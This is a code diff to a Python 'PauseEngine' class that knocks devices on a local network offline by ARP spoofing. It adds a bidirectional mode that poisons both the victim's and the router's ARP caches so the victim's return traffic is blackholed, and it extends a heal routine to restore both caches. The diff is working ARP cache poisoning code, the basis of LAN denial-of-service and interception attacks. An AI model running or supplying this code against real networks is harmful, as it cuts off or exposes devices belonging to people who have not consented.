@@ -172,9 +172,13 @@ class Target:
 class PauseEngine:
     """Turns a set of paused targets into ARP frames. One send per call; the loop lives in the daemon."""
 
-    def __init__(self, net: NetworkInfo, sender: Sender) -> None:
+    def __init__(self, net: NetworkInfo, sender: Sender, *, bidirectional: bool = False) -> None:
         self.net = net
         self.sender = sender
+        # When True, also poison the router so the victim's return traffic dies too, not just its
+        # outbound. This holds a streaming device that would otherwise recover the real router MAC
+        # between spoofs. It only touches the router's ARP entry for this one victim IP.
+        self.bidirectional = bidirectional
 
     def assert_safe(self, target: Target) -> None:
         if not target.ip or not target.mac:
@@ -187,23 +191,37 @@ class PauseEngine:
             raise PauseError("refusing to pause the router or this host")
 
     def spoof(self, target: Target) -> None:
-        """Tell the target that the router's IP is at our MAC, so its traffic comes to us and dies."""
+        """Redirect the target's traffic to us so it dies. Two-way also blackholes the return path."""
         self.assert_safe(target)
-        frame = build_arp_reply(
-            src_mac=self.net.our_mac,
-            dst_mac=target.mac,
-            sender_mac=self.net.our_mac,
-            sender_ip=self.net.gateway_ip,
-            target_mac=target.mac,
-            target_ip=target.ip,
+        # Tell the victim the router's IP is at our MAC, so its outbound traffic comes to us.
+        self.sender.send(
+            build_arp_reply(
+                src_mac=self.net.our_mac,
+                dst_mac=target.mac,
+                sender_mac=self.net.our_mac,
+                sender_ip=self.net.gateway_ip,
+                target_mac=target.mac,
+                target_ip=target.ip,
+            )
         )
-        self.sender.send(frame)
+        if self.bidirectional:
+            # Tell the router the victim's IP is at our MAC, so the victim's inbound traffic dies too.
+            self.sender.send(
+                build_arp_reply(
+                    src_mac=self.net.our_mac,
+                    dst_mac=self.net.gateway_mac,
+                    sender_mac=self.net.our_mac,
+                    sender_ip=target.ip,
+                    target_mac=self.net.gateway_mac,
+                    target_ip=self.net.gateway_ip,
+                )
+            )
 
     def heal(self, target: Target, *, repeat: int = 3) -> None:
-        """Restore the target's ARP cache to the real router MAC so it recovers at once."""
+        """Restore both ARP caches to the real mappings so the device recovers at once."""
         if not target.ip or not target.mac:
             return
-        frame = build_arp_reply(
+        victim = build_arp_reply(
             src_mac=self.net.our_mac,
             dst_mac=target.mac,
             sender_mac=self.net.gateway_mac,
@@ -211,8 +229,18 @@ class PauseEngine:
             target_mac=target.mac,
             target_ip=target.ip,
         )
+        router = build_arp_reply(
+            src_mac=self.net.our_mac,
+            dst_mac=self.net.gateway_mac,
+            sender_mac=target.mac,
+            sender_ip=target.ip,
+            target_mac=self.net.gateway_mac,
+            target_ip=self.net.gateway_ip,
+        )
         for _ in range(repeat):
-            self.sender.send(frame)
+            self.sender.send(victim)
+            if self.bidirectional:
+                self.sender.send(router)
 
     def close(self) -> None:
         self.sender.close()
